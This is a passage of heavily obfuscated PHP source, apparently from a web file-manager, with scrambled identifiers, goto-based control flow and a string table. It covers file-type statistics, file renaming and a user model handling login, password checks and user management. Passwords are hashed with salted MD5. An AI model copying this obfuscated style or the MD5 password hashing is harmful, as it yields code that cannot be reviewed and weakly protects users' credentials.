$dŠí…Ÿ‚ö = !$dŠí…Ÿ‚ö || $dŠí…Ÿ‚ö <= 0 ? 0 : $dŠí…Ÿ‚ö; return $dŠí…Ÿ‚ö; goto d‘ˆñö¾–; d‘ˆñö¾–: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($b‚ãËù‰Ş) { return $this->fileTypeProfile($b‚ãËù‰Ş, SourceModel::TYPE_USER); } public function groupFileTypeProfile($BáÅ‚‹ˆõ×) { return $this->fileTypeProfile($BáÅ‚‹ˆõ×, SourceModel::TYPE_GROUP); } private function fileTypeProfile($F©˜ÉÁ‡ª˜, $CİéÀ†šÏ) { goto EçŒ¯—·‹—; Fß†©äÂ„‚: if ($c¾Î÷¿ÒãŠ) { return $c¾Î÷¿ÒãŠ; } $fÜ¤¯–Ë© = array($fÎ›çà‰œÓ[541] => 0); if ($F©˜ÉÁ‡ª˜ != !1) { $fÜ¤¯–Ë©[$fÎ›çà‰œÓ[478]] = $F©˜ÉÁ‡ª˜; $fÜ¤¯–Ë©[$fÎ›çà‰œÓ[398]] = $CİéÀ†šÏ; } goto DØßšõÉ”ç; EçŒ¯—·‹—: $fÎ›çà‰œÓ =& $_SERVER[¹…ÕÄ]; $dâí®Ö÷¨ä = $fÎ›çà‰œÓ[1959] . $F©˜ÉÁ‡ª˜ . $fÎ›çà‰œÓ[70] . $CİéÀ†šÏ; $c¾Î÷¿ÒãŠ = Cache::get($dâí®Ö÷¨ä); goto Fß†©äÂ„‚; bğñİ±¥’ó: foreach ($cğî…âİÚ as $fÁÕåŠëË® => $e§ˆ†î¦ğº) { $fÜ¤¯–Ë©[$fÎ›çà‰œÓ[399]] = $this->fileTypeWhere($fÁÕåŠëË®); $dĞ¢´ß™°§[$fÁÕåŠëË®] = array($fÎ›çà‰œÓ[1961] => $e§ˆ†î¦ğº[$fÎ›çà‰œÓ[28]], $fÎ›çà‰œÓ[1962] => $this->where($fÜ¤¯–Ë©)->count(), $fÎ›çà‰œÓ[543] => $this->where($fÜ¤¯–Ë©)->sum($fÎ›çà‰œÓ[77])); } Cache::set($dâí®Ö÷¨ä, $dĞ¢´ß™°§, 1200); return $dĞ¢´ß™°§; goto Fñ‚ÉÑ‰³³; DØßšõÉ”ç: $dĞ¢´ß™°§ = array(); $dĞ¢´ß™°§[$fÎ›çà‰œÓ[1960]] = array($fÎ›çà‰œÓ[1961] => LNG($fÎ›çà‰œÓ[1960]), $fÎ›çà‰œÓ[1962] => $this->where($fÜ¤¯–Ë©)->count(), $fÎ›çà‰œÓ[543] => $this->where($fÜ¤¯–Ë©)->sum($fÎ›çà‰œÓ[77])); $cğî…âİÚ = KodIO::fileTypeList(); goto bğñİ±¥’ó; Fñ‚ÉÑ‰³³: } public function fileNameExist($a–´çÖôİ, $eô‘¡¾µ½…) { $fõ §¼İ¾® =& $_SERVER[¹…ÕÄ]; $bØÌùâ¾ôñ = $this->childList($a–´çÖôİ); foreach ($bØÌùâ¾ôñ as $EèĞÕòÂĞ¦) { if ($EèĞÕòÂĞ¦[$fõ §¼İ¾®[28]] == $eô‘¡¾µ½…) { return $EèĞÕòÂĞ¦[$fõ §¼İ¾®[390]]; } if (strtolower($EèĞÕòÂĞ¦[$fõ §¼İ¾®[28]]) == strtolower($eô‘¡¾µ½…)) { return $EèĞÕòÂĞ¦[$fõ §¼İ¾®[390]]; } } return !1; } public function childList($aåÉŸİî™Ë) { goto b×Óò¶—„Õ; c¢´¦´Û…: $BÏÔÆ¿Û = array($DæÕ’Ã–×‰[472] => intval($aåÉŸİî™Ë), $DæÕ’Ã–×‰[417] => 0); $f°¼ÙÕÙ¥â = $this->where($BÏÔÆ¿Û)->select(); $f°¼ÙÕÙ¥â = $f°¼ÙÕÙ¥â ? $f°¼ÙÕÙ¥â : array(); goto fºÌÖŒ — ; b×Óò¶—„Õ: $DæÕ’Ã–×‰ =& $_SERVER[¹…ÕÄ]; $cŸ—¥İ¿‹ = $DæÕ’Ã–×‰[1937] . $aåÉŸİî™Ë; if (isset(self::$cacheChildList[$cŸ—¥İ¿‹])) { return self::$cacheChildList[$cŸ—¥İ¿‹]; } goto c¢´¦´Û…; fºÌÖŒ — : self::$cacheChildList[$cŸ—¥İ¿‹] = $f°¼ÙÕÙ¥â; foreach ($f°¼ÙÕÙ¥â as $cĞ±®‡ã÷ª) { $cŸ—¥İ¿‹ = $DæÕ’Ã–×‰[432] . $cĞ±®‡ã÷ª[$DæÕ’Ã–×‰[390]]; self::$cacheSourceInfo[$cŸ—¥İ¿‹] = $cĞ±®‡ã÷ª; } return $f°¼ÙÕÙ¥â; goto EŒøƒ„õÍ‡; EŒøƒ„õÍ‡: } public function fileNameAuto($CìŸ“Ÿö®è, $FÌóªóêÅÀ, $Bê¢§ŒÑğ„ = REPEAT_RENAME, $Dà±•åÓô® = false) { $eŒ•µÎÇë =& $_SERVER[¹…ÕÄ]; $e—òæ«Ãö» = $this->childList($CìŸ“Ÿö®è); $F‰‹²›ƒ = array_to_keyvalue($e—òæ«Ãö», $eŒ•µÎÇë[33], $eŒ•µÎÇë[28]); return $this->fileNameAutoGet($F‰‹²›ƒ, $FÌóªóêÅÀ, $Bê¢§ŒÑğ„, $Dà±•åÓô®); } public function fileNameAutoGet($Cƒ™åªÊÌ·, $eÅ·§¿Ç§ô, $aÆàá×ƒŒ, $A™œƒâÓÇ†) { $b‹ÊÀÜ­„˜ =& $_SERVER[¹…ÕÄ]; if ($aÆàá×ƒŒ == REPEAT_REPLACE || !$Cƒ™åªÊÌ· || !in_array_not_case($eÅ·§¿Ç§ô, $Cƒ™åªÊÌ·) || $A™œƒâÓÇ† && $aÆàá×ƒŒ != REPEAT_RENAME_FOLDER) { return $eÅ·§¿Ç§ô; } if ($aÆàá×ƒŒ == REPEAT_SKIP) { return !1; } $Fä‡‰²Êç = $b‹ÊÀÜ­„˜[94] . get_path_ext($eÅ·§¿Ç§ô); $Fä‡‰²Êç = $Fä‡‰²Êç == $b‹ÊÀÜ­„˜[94] || $A™œƒâÓÇ† ? $b‹ÊÀÜ­„˜[33] : $Fä‡‰²Êç; for ($f…Ëæ¤²Ì‰ = 1; $f…Ëæ¤²Ì‰ <= count($Cƒ™åªÊÌ·) + 1; $f…Ëæ¤²Ì‰++) { $aõï©•çÂÏ = substr($eÅ·§¿Ç§ô, 0, strlen($eÅ·§¿Ç§ô) - strlen($Fä‡‰²Êç)); $cãêË›ø‡ = $aõï©•çÂÏ . "\50{$f…Ëæ¤²Ì‰}\x29{$Fä‡‰²Êç}"; if (!in_array_not_case($cãêË›ø‡, $Cƒ™åªÊÌ·)) { return $cãêË›ø‡; } } } } goto F“¸âêËƒ¯; d§ÒŸ‡í«Å: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\164\141\x62\x6c\145\116\x61\155\x65" => "\165\163\x65\162\137\155\x65\164\x61", "\155\x65\x74\x61\x46\151\145\154\x64" => "\165\163\145\x72\x49\104"); protected $simpleField = "\165\163\x65\x72\x49\104\54\156\151\x63\x6b\116\x61\x6d\145\54\156\141\x6d\x65\x2c\141\x76\141\164\141\x72\x2c\x73\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($DÍÑ§“‘”‰) { $a˜ÊèÍßô‹ =& $_SERVER[¹…ÕÄ]; $bâñõìÄñ¯ = $a˜ÊèÍßô‹[2086]; return array($a˜ÊèÍßô‹[1738] => array($DÍÑ§“‘”‰[0], $bâñõìÄñ¯), $a˜ÊèÍßô‹[1740] => array($DÍÑ§“‘”‰[0], $bâñõìÄñ¯), $a˜ÊèÍßô‹[2087] => array($DÍÑ§“‘”‰[0], $bâñõìÄñ¯)); } protected function getInfo($e·»—§‘ÚÃ, $aÇ¢²‹¶æ = false) { $b¾óßÂÙ­ = $this->getInfoSimple($e·»—§‘ÚÃ); if (!is_array($b¾óßÂÙ­)) { return array(); } if ($aÇ¢²‹¶æ) { return $this->_getInfoApply($b¾óßÂÙ­); } return $this->cacheFunctionGet($_SERVER[¹…ÕÄ][1747], $e·»—§‘ÚÃ); } protected function getInfoFull($aëíŒÍ”–, $Eé‚Í™À‘¿ = false) { $B„ÊÉÑ½Âª = $this->getInfoSimple($aëíŒÍ”–); if (!is_array($B„ÊÉÑ½Âª)) { return array(); } if ($Eé‚Í™À‘¿) { return $this->_getInfoApply($B„ÊÉÑ½Âª, !0); return $this->_getInfoApply($B„ÊÉÑ½Âª, !0); } return $this->cacheFunctionGet($_SERVER[¹…ÕÄ][2088], $aëíŒÍ”–); } private function _getInfoApply($fÅ ÕÔÏ®‘, $Eó»İ‹¤Ä = false) { goto d‘ñëª©…¤; FÈíÚø°: $fÅ ÕÔÏ®‘[$bÜÛà®ãªÌ[84]][$bÜÛà®ãªÌ[1927]] = isset($bö–êÅ¦å†[$bÜÛà®ãªÌ[1928]]) ? $bö–êÅ¦å†[$bÜÛà®ãªÌ[1928]] : null; if ($Eó»İ‹¤Ä) { $fÅ ÕÔÏ®‘[$bÜÛà®ãªÌ[439]] = $this->metaGet($fÅ ÕÔÏ®‘[$bÜÛà®ãªÌ[1504]]); } return $fÅ ÕÔÏ®‘; goto fÖ…ÔÌ±­‹; b¥Ÿ˜ƒì‹: $fÅ ÕÔÏ®‘ = $this->_listDataApplyItem($fÅ ÕÔÏ®‘); $bö–êÅ¦å† = Model($bÜÛà®ãªÌ[1183])->metaGet($fÅ ÕÔÏ®‘[$bÜÛà®ãªÌ[84]][$bÜÛà®ãªÌ[390]]); $fÅ ÕÔÏ®‘[$bÜÛà®ãªÌ[2091]] = $cöÜ˜‡¸; goto FÈíÚø°; d‘ñëª©…¤: $bÜÛà®ãªÌ =& $_SERVER[¹…ÕÄ]; if (!$fÅ ÕÔÏ®‘) { return $fÅ ÕÔÏ®‘; } $cöÜ˜‡¸ = md5($bÜÛà®ãªÌ[2089] . $fÅ ÕÔÏ®‘[$bÜÛà®ãªÌ[828]] . $bÜÛà®ãªÌ[2090] . $fÅ ÕÔÏ®‘[$bÜÛà®ãªÌ[28]]); goto b¥Ÿ˜ƒì‹; fÖ…ÔÌ±­‹: } protected function getInfoSimple($FîøƒÈÈÜ, $F†ÏŠ¶ÙŞË = false) { $e¾¸Í™ªÈ =& $_SERVER[¹…ÕÄ]; if (!$FîøƒÈÈÜ) { return array(); } if ($F†ÏŠ¶ÙŞË) { $f‡«ôÌ = $this->where(array($e¾¸Í™ªÈ[1504] => intval($FîøƒÈÈÜ)))->find(); if (!is_array($f‡«ôÌ)) { return array(); } $f‡«ôÌ[$e¾¸Í™ªÈ[2092]] = Action($e¾¸Í™ªÈ[2093])->parseUrl($f‡«ôÌ[$e¾¸Í™ªÈ[2092]]); return $f‡«ôÌ; } return $this->cacheFunctionGet($e¾¸Í™ªÈ[1741], $FîøƒÈÈÜ); } protected function getInfoSimpleOuter($FõŠä¢¶“ƒ) { goto DóÓÉ„·Ó¢; C²»¼¾¥„: return $aô·©¼ˆº¬; goto eÚ®åÖ§­Â; DóÓÉ„·Ó¢: $e´¶Ä¡ÍÈŒ =& $_SERVER[¹…ÕÄ]; if (!$FõŠä¢¶“ƒ || $FõŠä¢¶“ƒ == 0) { return array($e´¶Ä¡ÍÈŒ[1504] => $e´¶Ä¡ÍÈŒ[491], $e´¶Ä¡ÍÈŒ[28] => $e´¶Ä¡ÍÈŒ[159] . LNG($e´¶Ä¡ÍÈŒ[2094]) . $e´¶Ä¡ÍÈŒ[499], $e´¶Ä¡ÍÈŒ[2092] => STATIC_PATH . $e´¶Ä¡ÍÈŒ[2095]); } $Bƒ¥ğÔÒ‹Ë = $this->cacheFunctionGet($e´¶Ä¡ÍÈŒ[1741], $FõŠä¢¶“ƒ); goto eÍ³Œ›âŠ§; eÍ³Œ›âŠ§: $aô·©¼ˆº¬ = array_field_key($Bƒ¥ğÔÒ‹Ë, explode($e´¶Ä¡ÍÈŒ[47], $this->simpleField)); if (!$aô·©¼ˆº¬) { return array($e´¶Ä¡ÍÈŒ[1504] => $e´¶Ä¡ÍÈŒ[1063], $e´¶Ä¡ÍÈŒ[28] => $e´¶Ä¡ÍÈŒ[159] . LNG($e´¶Ä¡ÍÈŒ[2096]) . $e´¶Ä¡ÍÈŒ[499], $e´¶Ä¡ÍÈŒ[2092] => STATIC_PATH . $e´¶Ä¡ÍÈŒ[2097]); } $aô·©¼ˆº¬[$e´¶Ä¡ÍÈŒ[2092]] = Action($e´¶Ä¡ÍÈŒ[2093])->parseUrl($aô·©¼ˆº¬[$e´¶Ä¡ÍÈŒ[2092]]); goto C²»¼¾¥„; eÚ®åÖ§­Â: } protected function groupUser($D¯øá´½¼æ) { } public static function errorLang($e ÓØñ) { $C‚äÕÚçŒ =& $_SERVER[¹…ÕÄ]; $b……¢”®Ö = array(self::ERROR_USER_NOT_EXISTS => $C‚äÕÚçŒ[2098], self::ERROR_USER_PASSWORD_ERROR => $C‚äÕÚçŒ[2099], self::ERROR_USER_EXIST_NAME => $C‚äÕÚçŒ[2100], self::ERROR_USER_EXIST_PHONE => $C‚äÕÚçŒ[2101], self::ERROR_USER_EXIST_EMAIL => $C‚äÕÚçŒ[2102], self::ERROR_USER_LOGIN_LOCK => $C‚äÕÚçŒ[2103], self::ERROR_IP_NOT_ALLOW => $C‚äÕÚçŒ[2104], self::ERROR_USER_EXIST_NICKNAME => $C‚äÕÚçŒ[2105]); return LNG($b……¢”®Ö[$e ÓØñ]); } public function getInfoByMeta($fÁœ¬Ö£¥, $cªîíâŞ–ò) { $Eâœ¡í¨Æ =& $_SERVER[¹…ÕÄ]; $Dñ¥ÒÚÇÙÜ = Model($Eâœ¡í¨Æ[2106])->where(array($Eâœ¡í¨Æ[92] => $fÁœ¬Ö£¥, $Eâœ¡í¨Æ[370] => $cªîíâŞ–ò))->find(); if ($Dñ¥ÒÚÇÙÜ) { return $this->getInfo($Dñ¥ÒÚÇÙÜ[$Eâœ¡í¨Æ[1504]]); } return !1; } public function userLoginCheck($AÃÔµ¤·Ø, $Fäİ´äÈÆ) { $D·Óå„÷ÎŸ =& $_SERVER[¹…ÕÄ]; $AÄÓ‚æáÄÁ = $this->userLoginFind($AÃÔµ¤·Ø); if (!$AÄÓ‚æáÄÁ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($AÄÓ‚æáÄÁ[$D·Óå„÷ÎŸ[1504]], $Fäİ´äÈÆ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($AÄÓ‚æáÄÁ[$D·Óå„÷ÎŸ[1504]]); } public function userLoginFind($Fåğ¶‹Ğ®) { $dÜ‰Òæ‡Ó =& $_SERVER[¹…ÕÄ]; $Eë¯ß†×çÂ = array($dÜ‰Òæ‡Ó[28] => $Fåğ¶‹Ğ®, $dÜ‰Òæ‡Ó[1931] => $Fåğ¶‹Ğ®, $dÜ‰Òæ‡Ó[301] => $Fåğ¶‹Ğ®, $dÜ‰Òæ‡Ó[2107] => $Fåğ¶‹Ğ®, $dÜ‰Òæ‡Ó[936] => $dÜ‰Òæ‡Ó[938]); if ($this->nickNameRpt()) { unset($Eë¯ß†×çÂ[$dÜ‰Òæ‡Ó[1931]]); } return $this->where($Eë¯ß†×çÂ)->find(); } public function clearCache($B…¢ààÊÒ†) { $d¿ã…©‹Á¾ =& $_SERVER[¹…ÕÄ]; $this->cacheFunctionClear($d¿ã…©‹Á¾[1747], $B…¢ààÊÒ†); $this->cacheFunctionClear($d¿ã…©‹Á¾[1741], $B…¢ààÊÒ†); $this->cacheFunctionClear($d¿ã…©‹Á¾[2088], $B…¢ààÊÒ†); } public function userPasswordCheck($B±ÓÄØÉ£, $c«á­á¹­Æ) { $a¾±–­¹¿á =& $_SERVER[¹…ÕÄ]; $Cõë¬Õªšó = $this->where(array($a¾±–­¹¿á[1504] => intval($B±ÓÄØÉ£)))->find(); $dÓŸÔÍÙ¨ = $this->metaGet($B±ÓÄØÉ£); $D®½‰²ˆñÓ = isset($dÓŸÔÍÙ¨[$a¾±–­¹¿á[2108]]) ? $dÓŸÔÍÙ¨[$a¾±–­¹¿á[2108]] : $a¾±–­¹¿á[33]; if (md5($D®½‰²ˆñÓ . trim($c«á­á¹­Æ)) !== $Cõë¬Õªšó[$a¾±–­¹¿á[828]]) { return !1; } return !0; } public function userAdd($aäÍª•íÓˆ) { goto dŒ×ñáïÃ; F„Áâ»Î²ö: return $a½šóæ¦; goto BÖ“„Åß¯•; b¹¤İµ º: $E·°À³’Æá = $this->_checkExist($aäÍª•íÓˆ); if ($E·°À³’Æá !== !0) { return $E·°À³’Æá; } $a½šóæ¦ = $this->add($A©î‹ñøœ»); goto dÉ“‹ÉÅ»; dÉ“‹ÉÅ»: $AñÄ°±ñÄ¯ = array($b‚ƒ„Š›Š[2116] => $A©î‹ñøœ»[$b‚ƒ„Š›Š[828]], $b‚ƒ„Š›Š[2112] => $A©î‹ñøœ»[$b‚ƒ„Š›Š[1931]]); $this->userEdit($a½šóæ¦, $AñÄ°±ñÄ¯); Model($b‚ƒ„Š›Š[1183])->userRootAdd($a½šóæ¦); goto F„Áâ»Î²ö; dŒ×ñáïÃ: $b‚ƒ„Š›Š =& $_SERVER[¹…ÕÄ]; $A©î‹ñøœ» = array($b‚ƒ„Š›Š[407] => $aäÍª•íÓˆ[$b‚ƒ„Š›Š[28]], $b‚ƒ„Š›Š[2109] => $aäÍª•íÓˆ[$b‚ƒ„Š›Š[1388]], $b‚ƒ„Š›Š[2110] => isset($aäÍª•íÓˆ[$b‚ƒ„Š›Š[301]]) ? $aäÍª•íÓˆ[$b‚ƒ„Š›Š[301]] : $b‚ƒ„Š›Š[33], $b‚ƒ„Š›Š[2111] => isset($aäÍª•íÓˆ[$b‚ƒ„Š›Š[2107]]) ? $aäÍª•íÓˆ[$b‚ƒ„Š›Š[2107]] : $b‚ƒ„Š›Š[33], $b‚ƒ„Š›Š[2112] => isset($aäÍª•íÓˆ[$b‚ƒ„Š›Š[1931]]) ? $aäÍª•íÓˆ[$b‚ƒ„Š›Š[1931]] : $aäÍª•íÓˆ[$b‚ƒ„Š›Š[28]], $b‚ƒ„Š›Š[2113] => isset($aäÍª•íÓˆ[$b‚ƒ„Š›Š[2092]]) ? $aäÍª•íÓˆ[$b‚ƒ„Š›Š[2092]] : $b‚ƒ„Š›Š[33], $b‚ƒ„Š›Š[2114] => isset($aäÍª•íÓˆ[$b‚ƒ„Š›Š[2115]]) ? $aäÍª•íÓˆ[$b‚ƒ„Š›Š[2115]] : 1, $b‚ƒ„Š›Š[2116] => $aäÍª•íÓˆ[$b‚ƒ„Š›Š[828]], $b‚ƒ„Š›Š[1742] => isset($aäÍª•íÓˆ[$b‚ƒ„Š›Š[1651]]) ? $aäÍª•íÓˆ[$b‚ƒ„Š›Š[1651]] : 1024 * 1024 * 20, $b‚ƒ„Š›Š[1743] => 0, $b‚ƒ„Š›Š[2117] => 0, $b‚ƒ„Š›Š[1786] => isset($aäÍª•íÓˆ[$b‚ƒ„Š›Š[705]]) ? $aäÍª•íÓˆ[$b‚ƒ„Š›Š[705]] : 1); if (!empty($aäÍª•íÓˆ[$b‚ƒ„Š›Š[1504]])) { $A©î‹ñøœ»[$b‚ƒ„Š›Š[1504]] = $aäÍª•íÓˆ[$b‚ƒ„Š›Š[1504]]; } goto b¹¤İµ º; BÖ“„Åß¯•: } protected function userEditTest($CÓ…ŞÜ¦˜, $c†Š¦©”) { return $this->call($_SERVER[¹…ÕÄ][2118], $CÓ…ŞÜ¦˜, $c†Š¦©”); } protected function userEdit($DÍ ÄÕ£Õ, $F‚¤îÔŸ­Ï) { goto E”‘‘µ‚Êë; EÛœİŞ™”: return !0; goto Dñî½Ù°‘â; CÕ  „–ø¯: $this->where(array($A¦Â£…ÄÇ÷[1496] => $DÍ ÄÕ£Õ))->save($F‚¤îÔŸ­Ï); if (isset($F‚¤îÔŸ­Ï[$A¦Â£…ÄÇ÷[1931]])) { $this->setNamePinyin($DÍ ÄÕ£Õ, $F‚¤îÔŸ­Ï[$A¦Â£…ÄÇ÷[1931]]); } $this->clearCache($DÍ ÄÕ£Õ); goto EÛœİŞ™”; B­Ì„‘¬ÊË: $AŞÉƒ™É—¼ = $this->_checkExist($F‚¤îÔŸ­Ï, $DÍ ÄÕ£Õ); if ($AŞÉƒ™É—¼ !== !0) { return $AŞÉƒ™É—¼; } if (isset($F‚¤îÔŸ­Ï[$A¦Â£…ÄÇ÷[828]]) && trim($F‚¤îÔŸ­Ï[$A¦Â£…ÄÇ÷[828]]) != $A¦Â£…ÄÇ÷[33]) { $e¡ÅœÑ¥¬ = $this->metaGet($DÍ ÄÕ£Õ); if (empty($e¡ÅœÑ¥¬[$A¦Â£…ÄÇ÷[2108]])) { $e¡ÅœÑ¥¬[$A¦Â£…ÄÇ÷[2108]] = rand_string(10); Model($A¦Â£…ÄÇ÷[497])->metaSet($DÍ ÄÕ£Õ, $A¦Â£…ÄÇ÷[2108], $e¡ÅœÑ¥¬[$A¦Â£…ÄÇ÷[2108]]); } $F‚¤îÔŸ­Ï[$A¦Â£…ÄÇ÷[828]] = md5($e¡ÅœÑ¥¬[$A¦Â£…ÄÇ÷[2108]] . trim($F‚¤îÔŸ­Ï[$A¦Â£…ÄÇ÷[828]])); } else { unset($F‚¤îÔŸ­Ï[$A¦Â£…ÄÇ÷[828]]); } goto CÕ  „–ø¯; E”‘‘µ‚Êë: $A¦Â£…ÄÇ÷ =& $_SERVER[¹…ÕÄ]; $eŒ´ÕÏôÎ = $this->getInfoSimple($DÍ ÄÕ£Õ); if (!$eŒ´ÕÏôÎ) { return !1; } goto B­Ì„‘¬ÊË; Dñî½Ù°‘â: } public function setNamePinyin($bó¶ÍÈ¶±Ø, $AÕĞÛÔåß¯ = false) { $b Ú”òÕŒª =& $_SERVER[¹…ÕÄ]; if (!$AÕĞÛÔåß¯) { $c‡˜¶Œ¯Ë = $this->getInfoSimple($bó¶ÍÈ¶±Ø); $AÕĞÛÔåß¯ = $c‡˜¶Œ¯Ë[$b Ú”òÕŒª[1931]] ? $c‡˜¶Œ¯Ë[$b Ú”òÕŒª[1931]] : $c‡˜¶Œ¯Ë[$b Ú”òÕŒª[28]]; } $F†·Á‚Æñ = Model($b Ú”òÕŒª[501]); if (!Input::check($AÕĞÛÔåß¯, $b Ú”òÕŒª[551])) { return $F†·Á‚Æñ->metaSet($bó¶ÍÈ¶±Ø, array($b Ú”òÕŒª[438] => $b Ú”òÕŒª[33], $b Ú”òÕŒª[437] => $b Ú”òÕŒª[33])); } return $F†·Á‚Æñ->metaSet($bó¶ÍÈ¶±Ø, array($b Ú”òÕŒª[438] => str_replace($b Ú”òÕŒª[50], $b Ú”òÕŒª[33], Pinyin::encode($AÕĞÛÔåß¯)), $b Ú”òÕŒª[437] => Pinyin::encode($AÕĞÛÔåß¯, $b Ú”òÕŒª[552]))); } private function nickNameRpt() { $D¼ßÂ´Âìà =& $_SERVER[¹…ÕÄ]; $dŠÍ¢î‹ğë = Model($D¼ßÂ´Âìà[1102])->get($D¼ßÂ´Âìà[2119]); $bŞöí¨§Ü = $GLOBALS[$D¼ßÂ´Âìà[6]][$D¼ßÂ´Âìà[376]][$D¼ßÂ´Âìà[2119]]; $fğÑ›‘ˆ½¾ = !is_null($dŠÍ¢î‹ğë) ? $dŠÍ¢î‹ğë : $bŞöí¨§Ü; return !!$fğÑ›‘ˆ½¾; } private function _checkExist($FÔÚ«ƒ„³Œ, $b¶Ô¤­Ğ = false) { $fîÖ£´º¢ =& $_SERVER[¹…ÕÄ]; $eîÈĞï½Ñ× = array($fîÖ£´º¢[28] => UserModel::ERROR_USER_EXIST_NAME, $fîÖ£´º¢[1931] => UserModel::ERROR_USER_EXIST_NICKNAME, $fîÖ£´º¢[301] => UserModel::ERROR_USER_EXIST_EMAIL, $fîÖ£´º¢[2107] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($eîÈĞï½Ñ×[$fîÖ£´º¢[1931]]); } $F‹ªÎÑˆŸ„ = $b¶Ô¤­Ğ ? array($fîÖ£´º¢[1504] => array($fîÖ£´º¢[2120], $b¶Ô¤­Ğ)) : array(); foreach ($eîÈĞï½Ñ× as $d²¶ØƒŠˆ => $E²™íö¡çÀ) { $dÙÓ¼Šè÷ = array(); foreach ($eîÈĞï½Ñ× as $Dò‹ìÚåØ¿ => $A‡‰á‡§í°) { if (isset($FÔÚ«ƒ„³Œ[$Dò‹ìÚåØ¿]) && $FÔÚ«ƒ„³Œ[$Dò‹ìÚåØ¿]) { $dÙÓ¼Šè÷[] = $FÔÚ«ƒ„³Œ[$Dò‹ìÚåØ¿]; } } if (!$dÙÓ¼Šè÷) { continue; } $fÜ‚ç‡Ü¡ = array_merge(array($d²¶ØƒŠˆ => array($fîÖ£´º¢[7], $dÙÓ¼Šè÷)), $F‹ªÎÑˆŸ„); $F‰ß¯ñî” = $this->where($fÜ‚ç‡Ü¡)->find(); if ($F‰ß¯ñî”) { return $E²™íö¡çÀ; } } return !0; } public function userListInfo($A²©©Š‚Ç) { $EÜ…Îß†ˆ° =& $_SERVER[¹…ÕÄ]; $a©åƒ…ó¹ = array(); $A²©©Š‚Ç = is_array($A²©©Š‚Ç) ? array_unique($A²©©Š‚Ç) : array(); if (!$A²©©Š‚Ç) { return $a©åƒ…ó¹; } if (count($A²©©Š‚Ç) < 20) { foreach ($A²©©Š‚Ç as $DÉªÈ½‚ª·) { $a©åƒ…ó¹[$DÉªÈ½‚ª· . $EÜ…Îß†ˆ°[33]] = $this->getInfoSimpleOuter($DÉªÈ½‚ª·); } } else { $b™”–İàÅ‡ = array($EÜ…Îß†ˆ°[1496] => array($EÜ…Îß†ˆ°[405], $A²©©Š‚Ç)); if (count($A²©©Š‚Ç) == 1) { $b™”–İàÅ‡ = array($EÜ…Îß†ˆ°[1496] => $A²©©Š‚Ç[0]); } $DˆØ†Í¦ = Model($EÜ…Îß†ˆ°[497])->field($this->simpleField)->where($b™”–İàÅ‡)->select(); $DˆØ†Í¦ = array_to_keyvalue($DˆØ†Í¦, $EÜ…Îß†ˆ°[1504]); foreach ($A²©©Š‚Ç as $DÉªÈ½‚ª·) { $Dóˆ­ç°ˆ = $DˆØ†Í¦[$DˆØ†Í¦[$DÉªÈ½‚ª·]]; if (!$Dóˆ­ç°ˆ) { $a©åƒ…ó¹[$DÉªÈ½‚ª· . $EÜ…Îß†ˆ°[33]] = $this->getInfoSimpleOuter($DÉªÈ½‚ª·); continue; } $Dóˆ­ç°ˆ[$EÜ…Îß†ˆ°[2092]] = Action($EÜ…Îß†ˆ°[2093])->parseUrl($Dóˆ­ç°ˆ[$EÜ…Îß†ˆ°[2092]]); $a©åƒ…ó¹[$DÉªÈ½‚ª· . $EÜ…Îß†ˆ°[33]] = $Dóˆ­ç°ˆ; } } return $a©åƒ…ó¹; } protected function userStatus($böÇ›Š¾Ô, $EÜˆ†öÆÖ²) { $d”®Ø¤­‰ = $this->getInfoSimple($böÇ›Š¾Ô); if (!$d”®Ø¤­‰) { return !1; } $Aœ¶Ñê¤Œ = array($_SERVER[¹…ÕÄ][705] => $EÜˆ†öÆÖ²); return $this->userEdit($böÇ›Š¾Ô, $Aœ¶Ñê¤Œ); } protected function userRemove($Dğ¬ÒÅÃ…Î) { goto dôÇ›ˆÇÆÉ; a‹¤ŞŠ¸öÃ: $C÷Üİæ¤à¥ = array($Bˆ÷³Îéø³[1496] => $Dğ¬ÒÅÃ…Î); Model($Bˆ÷³Îéø³[558])->where($C÷Üİæ¤à¥)->delete(); Model($Bˆ÷³Îéø³[2121])->where($C÷Üİæ¤à¥)->delete(); goto DÄÚËÒ®ë; BºÚà£¼£Ø: Model($Bˆ÷³Îéø³[1948])->restoreUserAll($Dğ¬ÒÅÃ…Î); Model($Bˆ÷³Îéø³[770])->userRootRemove($Dğ¬ÒÅÃ…Î); return $this->where($C÷Üİæ¤à¥)->delete(); goto aÄ…¦²˜; dôÇ›ˆÇÆÉ: $Bˆ÷³Îéø³ =& $_SERVER[¹…ÕÄ]; $fŠÍß†èáµ = $this->getInfoSimple($Dğ¬ÒÅÃ…Î); if (!$fŠÍß†èáµ) { return !1; } goto a‹¤ŞŠ¸öÃ; DÄÚËÒ®ë: Model($Bˆ÷³Îéø³[1749])->where($C÷Üİæ¤à¥)->delete(); Model($Bˆ÷³Îéø³[2106])->where($C÷Üİæ¤à¥)->delete(); Model($Bˆ÷³Îéø³[2122])->where($C÷Üİæ¤à¥)->delete(); goto BºÚà£¼£Ø; aÄ…¦²˜: } protected function userGroupSet($c„¨õçŒ¼, $Bë¿‚™®º™, $cäÎàÁ‡ø· = array()) { goto c¿¢Ô”àöÉ; f¨Œ´ˆäğª: return $b¤¹ñºˆóé->addAll($d¿ ²Ë²›“, array(), !0); goto A­”ƒåÕ¢; fŒ´ÕÜœŸ: $d¿ ²Ë²›“ = array(); $e•§áÆáïÏ = 0; foreach ($Bë¿‚™®º™ as $Cæ­ƒ¼£ˆÀ => $e‚äÀó«»‰) { $c”½­”ùÉò = array($fäõòô¥ß[1504] => $c„¨õçŒ¼, $fäõòô¥ß[1667] => $Cæ­ƒ¼£ˆÀ, $fäõòô¥ß[1763] => $e‚äÀó«»‰); $c”½­”ùÉò[$fäõòô¥ß[1690]] = isset($cäÎàÁ‡ø·[$e•§áÆáïÏ]) ? $cäÎàÁ‡ø·[$e•§áÆáïÏ] : 0; 